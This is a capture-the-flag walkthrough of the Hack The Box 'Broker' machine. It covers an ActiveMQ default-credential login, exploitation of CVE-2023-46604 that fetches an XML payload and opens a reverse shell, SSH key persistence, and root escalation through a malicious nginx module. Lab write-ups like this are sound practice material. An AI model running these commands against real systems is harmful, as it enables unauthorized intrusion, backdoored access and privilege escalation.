# Broker - Easy

```sh
sudo vim /etc/hosts
# add broker.htb

nmap -T4 -p- -A -Pn -v broker.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
    * 80/tcp - http - nginx 1.18.0
    * 1883/tcp - mqtt
    * 5672/tcp - amqp?
    * 8161/tcp - http - Jetty 9.4.39.v20210325
    * 38945/tcp - tcpwrapped
    * 61613/tcp - stomp - Apache ActiveMQ
    * 61614/tcp - http - Jetty 9.4.39.v20210325
    * 61616/tcp - apachemq - ActiveMQ OpenWire transport

* ```nmap``` scan shows that the webpages on port 80 & 8161 are using basic auth and both mention 'basic realm=ActiveMQRealm'

* ```nmap``` also shows (using the ```mqtt-subscribe``` script) a couple of topics - 'ActiveMQ/Advisory/MasterBroker' & 'ActiveMQ/Advisory/Consumer/Topic/#'

* for the webpage on port 80, we get a basic authentication pop-up

* trying default creds like 'admin:admin' works here and we get access to the landing page for Apache ActiveMQ

* according to Google, Apache ActiveMQ is a Java-based message broker and message-oriented middleware, used for communication between loosely-coupled systems & apps

* the landing page has links to '/admin' and '/demo' - only the former works and we have the access to the ActiveMQ Console page now

* the broker details are given in the console page, and it shows the version 5.15.15; the page also links to other features like queues, topics, subscribers, etc.

* the topics page mentions a few topic names like 'ActiveMQ/Advisory/MasterBroker', but no other useful info is found

* Googling for exploits associated with Apache ActiveMQ 5.15.15 leads to results for [CVE-2023-46604](https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/), a RCE vuln in the broker and OpenWire protocol

* searching on GitHub, we get multiple exploits - we can try running [this exploit](https://github.com/evkl1d/CVE-2023-46604):

    ```sh
    git clone https://github.com/evkl1d/CVE-2023-46604.git

    cd CVE-2023-46604

    ls -la

    vim poc.xml
    # update IP and port values for reverse shell

    nc -nvlp 4444
    # setup listener

    python3 -m http.server
    # start server to host the XML file

    python3 exploit.py -i broker.htb -p 61616 -u http://10.10.14.95:8000/poc.xml
    # run the exploit in the given format

    # this works and we get reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # 'activemq' user

    pwd
    # '/opt/apache-activemq-5.15.15/bin'

    ls -la
    # check files

    ls -la /opt

    ls -la /

    ls -la /home
    # we have only one user 'activemq'
    ```

* there is only one user 'activemq' and it has a home directory, so we can create a SSH directory and private key, so that we have stable access:

    ```sh
    cd

    mkdir .ssh

    cd .ssh
    ```

    ```sh
    # on attacker

    ssh-keygen -f activemq
    # create new keys for 'activemq' user without passphrase

    chmod 600 activemq

    cat activemq.pub
    # copy the public key
    ```

    ```sh
    # in reverse shell

    echo "ssh-rsa ..." > authorized_keys
    # paste key contents into the file "/home/activemq/.ssh/authorized_keys"

    chmod 600 authorized_keys
    ```

* now we should be able to login as 'activemq' user via SSH:

    ```sh
    ssh -i activemq activemq@broker.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` entry shows that we can run ```/usr/sbin/nginx``` as all users (including root) without password

* [searching on GTFObins gives us a few ways to abuse sudo privileges for nginx](https://gtfobins.org/gtfobins/nginx/) - we can use the library load technique to get the root flag:

    ```sh
    echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -
    # use given pyload to create malicious 'lib.so' file

    echo "load_module /home/activemq/lib.so;" > test
    # without semi-colon the exploit will fail

    sudo /usr/sbin/nginx -t -c /home/activemq/test
    # full path to config file is needed

    # this works and we get root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
